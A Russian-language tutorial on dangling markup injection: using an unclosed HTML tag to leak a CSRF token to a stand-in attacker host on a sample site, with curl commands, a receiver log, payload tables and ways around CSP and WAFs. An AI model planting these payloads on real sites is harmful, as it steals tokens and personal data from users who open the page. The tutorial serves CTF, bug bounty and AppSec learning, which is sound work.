## Вопрос, с которого всё начинается

Иногда на странице есть HTML-инъекция — твой тег попадает в разметку — но JavaScript исполнить не удаётся: CSP запрещает скрипты, или санитайзер вырезает всё исполняемое. Кажется, что инъекция бесполезна.

Вопрос: можно ли **украсть данные**, не выполняя ни строчки JS? Да — если оставить тег **незакрытым**. Браузер, «дотягивая» атрибут до закрывающей кавычки, сам отправит на твой сервер всё, что оказалось внутри. Это **dangling markup injection**, и сегодня разберём её на одном примере.

## Наш пример

Есть сайт `board.example`. В профиле есть поле «Отображаемое имя», и мы заметили, что оно рендерится **без экранирования** HTML. Проверим:

```bash
$ curl -s -X POST https://board.example/profile -b jar \
  --data-urlencode 'display_name=<b>Bob</b>'
$ curl -s https://board.example/profile -b jar | grep -o '<b>Bob</b>'
<b>Bob</b>
```

Тег `<b>` попал в разметку как тег. Настоящий `<script>` здесь не сработает — на странице строгий CSP `script-src 'self'`. Но HTML-инъекция есть, и этого достаточно.

Посмотрим, что идёт на странице **после** нашего имени. Оказывается, ниже — форма с CSRF-токеном:

```bash
$ curl -s https://board.example/profile -b jar | grep -n 'csrf'
41: <input type="hidden" name="csrf" value="8f3a1b2c9d...">
```

Токен лежит в скрытом поле сразу после нашей инъекции. Это цель.

## Шаг 1: почему незакрытый тег утекает данные

HTML-парсер очень «терпим» к незакрытым кавычкам. Если мы вставим:

```html
<img src='https://ATTACKER:8000/?leak=
```

и следующий символ в исходной странице — **не** кавычка, браузер продолжит читать значение `src` до первой `'`, которая встретится позже. А позже идёт:

```html
<input type="hidden" name="csrf" value="8f3a1b2c9d...">
```

Кавычка перед `8f3a...` закрывает `value="..."` токена — и **это же** закрывает наш `src`. Значит, в `src` попадёт всё между нашим `?leak=` и этой кавычкой. Браузер отправит запрос на наш сервер — вместе с токеном. Так утекают данные **без JavaScript**.

## Шаг 2: поднимаем приёмник и вставляем payload

На своём хосте запускаем простой HTTP-сервер — он и будет «приёмником» утечки:

```bash
$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 ...
```

Теперь вставляем наш незакрытый тег в поле имени:

```bash
$ curl -s -X POST https://board.example/profile -b jar \
  --data-urlencode "display_name=<img src='http://ATTACKER_IP:8000/?leak="
```

Жертва открывает страницу профиля — и её браузер делает запрос на наш сервер:

```
ATTACKER_IP - - "GET /?leak=%3Cinput%20type%3D%22hidden%22%20name%3D%22csrf%22%20value%3D%228f3a1b2c9d... HTTP/1.1" 404 -
```

URL-декодируем `leak` — и получаем токен. Утечка подтверждена. Артефакт — реальный CSRF-токен в логах нашего приёмника.

## Шаг 3: варианты payload

Разные теги «поглощают» разные фрагменты:

| Payload | Что поглощает |
|---------|---------------|
| `<img src='//attacker/?` | всё до следующего `'` |
| `<img src=//attacker/?` | всё до пробела/`>` (без кавычек) |
| `<a href='//attacker/?` | ссылки вокруг |
| `<form action='//attacker/?` | содержимое формы |
| `<meta http-equiv=refresh content='0;url=//attacker/?` | работает в `<head>` |
| `<style>@import '//attacker/?` | утечка через CSS |
| `<textarea>` | поглощает всё до `</textarea>` |
| `<title>` | поглощает всё до `</title>` |

Выбор зависит от контекста: в каком теге/атрибуте оказался ввод и какой символ закроет поглощение. Если раньше встречается `'`, используй `"` (и наоборот), а если кавычки мешают — `<textarea>`/`<title>` поглощают до закрывающего тега.

## Шаг 4: `<base>` — угон всех ссылок

Особый случай — тег `<base>`. Он задаёт базовый адрес для **всех** относительных ссылок страницы:

```html
<base href='https://attacker.example/'>
```

После этого `<a href="/logout">` и `<form action="/update">` будут резолвиться относительно твоего домена. Клик жертвы по такой ссылке уводит её на твой сервер, а отправка формы — передаёт данные тебе. Одна инъекция перехватывает **всю** относительную навигацию, что часто серьёзнее одной утечки токена. Проверь, фильтруется ли `<base>` — часто нет.

## Шаг 5: обход CSP и санитайзеров

Dangling markup ценен именно тем, что работает при строгом CSP. Логика такая: `script-src` может быть жёстким, но `img-src`/`style-src` обычно шире — по ним и утекаем. Проверим политику:

```bash
$ curl -sI https://board.example/ | grep -i content-security-policy
content-security-policy: script-src 'self'; img-src 'self' cdn.example; style-src 'self'
```

Если `img-src` не пускает наш хост — переключаемся на другой канал:

| Проблема | Обход |
|----------|-------|
| Кавычка встречается раньше | использовать `<textarea>`/`<title>` |
| Санитайзер «дозакрывает» теги | искать контекст без закрытия (атрибут, комментарий) |
| CSP `img-src 'none'` | `<base>`, `<meta refresh>`, `<link rel=stylesheet>` |
| WAF ловит `<img` | другой тег, регистр, разбиение |

Если санитайзер «дозакрывает» теги, ищи контекст, где тег остаётся открытым — например, внутри атрибута или комментария.

## Шаг 6: почему это не «просто XSS»

Dangling markup — это **утечка**, а не исполнение. Поэтому:

- не отбрасывай HTML-инъекцию как «неопасную» — даже без JS она крадёт токены;
- утечка идёт **автоматически**: браузер сам делает запрос, без взаимодействия со скриптом;
- она работает там, где XSS заблокирован (CSP, санитайзер, нет исполняемого контекста);
- в отчёте доказывай **конкретным токеном**, полученным на приёмнике, а не «должно работать».

Особенно ценен этот вектор как **запасной путь**: если XSS не проходит, а HTML-инъекция есть — dangling markup всё равно вытащит CSRF-токен или PII. Второе его преимущество — утечка происходит **без участия жертвы** (кроме открытия страницы): браузер сам запрашивает ресурс. Поэтому в аудите всегда отмечай отдельно, есть ли «частичный контроль HTML» — даже если полноценного скрипта добиться не удалось, это может быть достаточным для критичного влияния.

## Что мы теперь знаем

- Dangling markup — кража HTML вокруг инъекции **без JavaScript**.
- Работает через незакрытый тег: браузер «дотягивает» атрибут до следующей кавычки.
- Всё, что попало между payload и кавычкой, уходит на твой сервер.
- Payload бывает разный: `<img>`, `<a>`, `<form>`, `<meta>`, `<style>`, `<textarea>`.
- `<base>` угоняет **все** относительные ссылки страницы.
- Работает при строгом CSP — использует `img-src`/`style-src`, а не `script-src`.
- Артефакт — реальный CSRF-токен/секрет в логах приёмника.

## На что смотреть дальше

- **Ищи HTML-инъекцию, а не только «настоящий» XSS** — dangling markup эксплуатирует именно её.
- **Подбирай кавычку** (`'` vs `"`) так, чтобы «съесть» нужный фрагмент.
- **Проверь CSP:** какой канал разрешён — по тому и утекай.
- **Не забудь `<base>`** — если он не фильтруется, это перехват всей навигации.
- **Поднимай приёмник** (`python3 -m http.server`/`nc`) — без него утечку не увидишь.
- **Только с согласия** — payload сохраняется и срабатывает у жертв.

## Куда дальше

Дальше мы разберём **CSS-инъекцию** — ещё один способ утечки и «деанона» через стили (`web-css-injection`). А пока главное запомни: даже без JavaScript **HTML-инъекция крадёт данные**, если оставить тег незакрытым.

## Где пригодится

- **CTF (Web):** задачи с HTML-инъекцией без XSS, где флаг/токен утекает в разметке.
- **Bug bounty:** кража CSRF-токенов и токенов сброса пароля через «незначительную» HTML-инъекцию.
- **Пентест:** доказательство impact при наличии только HTML-инъекции.
- **Работа (AppSec/Dev):** понимание, почему недостаточно экранировать `<>` — нужно кодировать атрибуты и контексты.
